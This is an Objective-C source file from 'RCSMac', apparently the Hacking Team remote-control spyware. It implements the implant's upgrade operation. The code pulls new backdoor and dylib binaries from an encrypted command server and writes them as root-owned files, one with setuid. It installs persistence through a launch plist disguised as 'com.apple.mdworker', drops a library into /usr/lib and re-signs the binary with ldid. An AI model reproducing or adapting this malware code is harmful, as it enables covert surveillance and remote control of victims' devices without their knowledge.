/*
 *  UpgradeNetworkOperation.m
 *  RCSMac
 *
 *
 *  Created by revenge on 2/3/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "UpgradeNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSICommon.h"

//#import "RCSMLogger.h"
//#import "RCSMDebug.h"

//#define DEBUG_UPGRADE_NOP
#define infoLog NSLog
#define errorLog NSLog
#define warnLog NSLog

#define	S_ISUID		0004000		/* [XSI] set user id on execution */
#define	S_IRWXU		0000700		/* [XSI] RWX mask for owner */
#define	S_IRUSR		0000400		/* [XSI] R for owner */
#define	S_IWUSR		0000200		/* [XSI] W for owner */
#define	S_IRGRP		0000040		/* [XSI] R for group */
#define	S_IXGRP		0000010		/* [XSI] X for group */
#define	S_IROTH		0000004		/* [XSI] R for other */
#define	S_IWOTH		0000002		/* [XSI] W for other */
#define	S_IXOTH		0000001		/* [XSI] X for other */

#define CORE_UPGRADE  @"core"
#define DYLIB_UPGRADE @"dylib"

@interface UpgradeNetworkOperation (private)

- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath;
- (BOOL)_saveAndSignBackdoor:(NSData*)fileData;
- (BOOL)_saveDylibUpdate:(NSData*)fileData;
@end

@implementation UpgradeNetworkOperation (private)

- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath
{
  BOOL success = NO;
  
  //
  // Forcing suid permission on the backdoor upgrade
  //
  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner      = [NSNumber numberWithInt: 0];
  
  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                  permission,
                                  NSFilePosixPermissions,
                                  owner,
                                  NSFileOwnerAccountID,
                                  nil];
  
  success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                             ofItemAtPath: upgradePath
                                                    error: nil];
  
  if (success == NO)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"Error while changing attributes on the upgrade file");
#endif
      return success;
    }
  
  //
  // Once the backdoor has been written, edit the backdoor Loader in order to
  // load the new updated backdoor upon reboot
  //
  NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@", BACKDOOR_DAEMON_PLIST];
  
  NSString *_backdoorPath = [[[NSBundle mainBundle] executablePath]
                             stringByReplacingOccurrencesOfString: gBackdoorName
                                                       withString: gBackdoorUpdateName];
  
  [[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
                                             error: nil];
  
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
  
  NSDictionary *innerDict;
  
  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
               @"com.apple.mdworker", @"Label",
               [NSNumber numberWithBool: FALSE], @"OnDemand",
               [NSArray arrayWithObjects: _backdoorPath, nil],
               @"ProgramArguments", nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  
  success = [rootObj writeToFile: backdoorLaunchAgent
                      atomically: NO];
  
  [backdoorLaunchAgent release];
  
  if (success == NO)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"Error while writing backdoor launchAgent plist");
#endif
      return success;
    }
  
  return YES;
}

- (BOOL)_saveDylibUpdate:(NSData*)fileData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  
  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"/usr/lib/%@",
                            gDylibName];
  
  // Create clean files for ios hfs 
  NSError *err = nil;
  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                             error: &err];
#ifdef DEBUG
  if (err != nil)
    NSLog(@"%s: removing old dylib update with result %@", __FUNCTION__, err);
#endif
  
  bRet = [fileData writeToFile: _upgradePath
                    atomically: YES];

#ifdef DEBUG
  NSLog(@"%s: dylib upgrade gDylibName = %@ saved with status %d", 
        __FUNCTION__, gDylibName, bRet);
#endif
  
  //
  // Forcing permission
  //
  u_long permissions = (S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner = [NSNumber numberWithInt: 0];
  
  [[NSFileManager defaultManager] changeFileAttributes:
                                                 [NSDictionary dictionaryWithObjectsAndKeys:
                                                  permission,
                                                  NSFilePosixPermissions,
                                                  owner,
                                                  NSFileOwnerAccountID,
                                                  nil] 
                                                atPath: _upgradePath];
  
  [_upgradePath release];
  
  [pool release];
  
  return TRUE;  
}

- (BOOL)_saveAndSignBackdoor:(NSData*)fileData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  
  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                            [[NSBundle mainBundle] bundlePath],
                            gBackdoorUpdateName];
  
  // Create clean files for ios hfs 
  NSError *err = nil;
  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                             error: &err];
#ifdef DEBUG
  if (err != nil)
    NSLog(@"%s: removing old core update with result %@", __FUNCTION__, err);
#endif
  
  
  bRet = [fileData writeToFile: _upgradePath
                    atomically: YES];
  
#ifdef DEBUG
  NSLog(@"%s: backdoor upgrade gBackdoorUpdateName = %@ saved with status %d", 
        __FUNCTION__, gBackdoorUpdateName, bRet);
#endif
  
  //
  // Forcing permission
  //
  u_long permissions = S_IRWXU;
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner = [NSNumber numberWithInt: 0];
  
  [[NSFileManager defaultManager] changeFileAttributes:
   [NSDictionary dictionaryWithObjectsAndKeys:
    permission,
    NSFilePosixPermissions,
    owner,
    NSFileOwnerAccountID,
    nil] 
                                                atPath: _upgradePath];
  
  //
  // Once the backdoor has been written, edit the backdoor Loader in order to
  // load the new updated backdoor upon reboot
  //
  NSString *backdoorLoaderPath = [[[NSBundle mainBundle] bundlePath]
                                  stringByAppendingPathComponent: @"srv.sh"];
  
  NSMutableData *_fileContent = [[NSMutableData alloc] initWithContentsOfFile: backdoorLoaderPath];
  NSMutableString *fileContent = [[NSMutableString alloc] initWithData: _fileContent
                                                              encoding: NSUTF8StringEncoding];
  
  [fileContent replaceOccurrencesOfString: gBackdoorName
                               withString: gBackdoorUpdateName
                                  options: NSCaseInsensitiveSearch
                                    range: NSMakeRange(0, [fileContent length])];
  
#ifdef DEBUG
  NSLog(@"%s: service file replaced with %@", __FUNCTION__, fileContent);
#endif
  
  NSData *updateData = [fileContent dataUsingEncoding: NSUTF8StringEncoding];
  
  [updateData writeToFile: backdoorLoaderPath
               atomically: YES];
  
  pid_t pid = fork();
  
  if (pid == 0) 
    {
#ifdef DEBUG
    NSLog(@"%s: launching ldid [%d]", __FUNCTION__, pid);
#endif
    execlp("/usr/bin/ldid", "/usr/bin/ldid", "-S", [gBackdoorUpdateName UTF8String], NULL);
    }
  
  int status;
  waitpid(pid, &status, 0);
  
#ifdef DEBUG
  NSLog(@"%s: rebuilding macho pseudo sig = %d", __FUNCTION__, status);
#endif
  
  [_fileContent release];
  [fileContent release];
  
  [pool release];
  
  return TRUE;  
}

@end

@implementation UpgradeNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      
#ifdef DEBUG_UPGRADE_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"");
#endif
  
  uint32_t command              = PROTO_UPGRADE;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];

  if (replyData == nil)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"empty reply from server");
#endif
      [commandData release];
      [outerPool release];
    
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"sha mismatch");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"No upload request available (command %d)", command);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfFilesLeft = 0;
  uint32_t filenameSize   = 0;
  uint32_t fileSize       = 0;
  
  @try
    {
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      [replyDecrypted getBytes: &numOfFilesLeft
                         range: NSMakeRange(8, sizeof(uint32_t))];
      [replyDecrypted getBytes: &filenameSize
                         range: NSMakeRange(12, sizeof(uint32_t))];
      [replyDecrypted getBytes: &fileSize
                         range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"exception on parameters makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"packetSize    : %d", packetSize);
  infoLog(@"numOfFilesLeft: %d", numOfFilesLeft);
  infoLog(@"filenameSize  : %d", filenameSize);
  infoLog(@"fileSize      : %d", fileSize);
#endif
  
  NSData *stringData;
  NSData *fileContent;
  
  @try
    {
      stringData  = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
      fileContent = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"exception on stringData makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
  
  if (filename == nil)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"filename is empty, error on unpascalize");
#endif
    }
  else
    {
#ifdef DEBUG_UPGRADE_NOP
      infoLog(@"filename: %@", filename);
      infoLog(@"file content: %@", fileContent);
#endif
    
      if ([filename isEqualToString: CORE_UPGRADE])
        {
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Received a core upgrade");
#endif
          if ([self _saveAndSignBackdoor: fileContent] == NO)
            {
#ifdef DEBUG_UPGRADE_NOP
              errorLog(@"Error while updating files for core upgrade");
#endif
            }
        }
      else if ([filename isEqualToString: DYLIB_UPGRADE])
        {
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Received a dylib upgrade");
#endif
        if ([self _saveDylibUpdate: fileContent] == NO)
          {
#ifdef DEBUG_UPGRADE_NOP
            errorLog(@"Error while updating files for dylib upgrade");
#endif
          }
        }
      else if ([filename isEqualToString: KEXT_UPGRADE])
        {
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Received a kext upgrade, not yet implemented");
#endif
          
          // TODO: Update kext binary inside Resources subfolder
        }
      else
        {
#ifdef DEBUG_UPGRADE_NOP
          errorLog(@"Upgrade not supported (%@)", filename);
#endif
        }
    }
  
  [fileContent release];
  [stringData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  //
  // Get files until there's no one left
  //
  if (numOfFilesLeft != 0)
    {
      return [self perform];
    }
  
  return YES;
}

@end